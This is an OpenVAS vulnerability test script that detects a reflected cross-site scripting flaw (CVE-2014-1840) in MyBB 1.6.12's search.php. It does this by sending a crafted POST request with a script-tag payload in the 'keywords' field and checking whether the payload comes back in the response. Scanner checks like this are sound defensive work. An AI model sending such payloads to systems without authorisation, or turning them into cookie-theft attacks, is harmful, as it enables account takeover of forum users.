##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_mybb_keywords_xss_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# MyBB keywords Cross Site Scripting Vulnerability
#
# Authors:
# Shashi Kiran N <nskiran@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:mybb:mybb';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804234");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2014-1840");
  script_bugtraq_id(65344);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-02-05 15:23:57 +0530 (Wed, 05 Feb 2014)");
  script_name("MyBB keywords Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is running MyBB and is prone to cross site scripting vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP POST request and check whether it is
  able to read the string or not.");
  script_tag(name:"insight", value:"The flaw is due to an input passed via the 'keywords' parameter to
  'search.php', which is not properly sanitised before using it.");
  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to steal the victim's
  cookie-based authentication credentials.");
  script_tag(name:"affected", value:"MyBB version 1.6.12, Other versions may also be affected.");
  script_tag(name:"solution", value:"Upgrade to version 1.6.13 or later.");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/mybb-1612-post-cross-site-scripting");
  script_xref(name:"URL", value:"http://osandamalith.wordpress.com/2014/02/02/mybb-1-6-12-post-xss-0day/");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_mybb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("MyBB/installed");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"http://www.mybb.com");
  exit(0);
}

include("http_func.inc");

include("host_details.inc");


if( ! mybbPort = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:mybbPort ) ) exit( 0 );

if (dir == "/") dir = "";

## Send crafted request and receive the response
url = dir + "/search.php";
host = http_host_name(port:mybbPort);

payload = "action=do_search&keywords=qor'";
payload += '("<script>alert(/1234567890/)</script>';

mybbReq = string("POST ",url," HTTP/1.0\r\n",
                 "Host: " + host + "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ",strlen(payload), "\r\n\r\n",
                  payload);

mybbRes = http_send_recv(port:mybbPort, data:mybbReq);

if(mybbRes =~ "HTTP/1\.. 200" && "<script>alert(/1234567890/)</script>" >< mybbRes)
{
  security_message(port:mybbPort);
  exit(0);
}

exit(99);
